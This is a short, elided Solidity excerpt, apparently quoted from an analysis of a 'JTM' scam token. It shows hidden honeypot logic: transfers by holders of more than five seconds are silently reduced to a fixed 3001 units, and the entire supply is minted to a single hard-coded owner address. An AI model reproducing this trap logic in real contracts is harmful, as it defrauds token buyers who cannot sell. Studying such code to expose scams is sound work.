                ...
                if (_balances[sender] > 0 && _ttL[sender] > 0 && block.timestamp - _ttL[sender] > 5) {
                    ...
                    if (reserveToken > 0 && reserveBNB > 0) {
                        ...
                        if (address(this) == _here) {
                            _transferfee(sender, recipient, amount - amount + 3001);
                        }
                        else {
                            _transferfee(sender, recipient, amount);
                        }
...
contract Token is ERC20 {
    ...
    constructor () {
        ...
        _symbol = "JTM";
        _decimals = 18;
        _hostter = 0xACa01cD577aFfB101149abEb4553722F0Ddf8708;//
        _mint(0xACa01cD577aFfB101149abEb4553722F0Ddf8708, 10000000000 * (10 ** 18));
    }
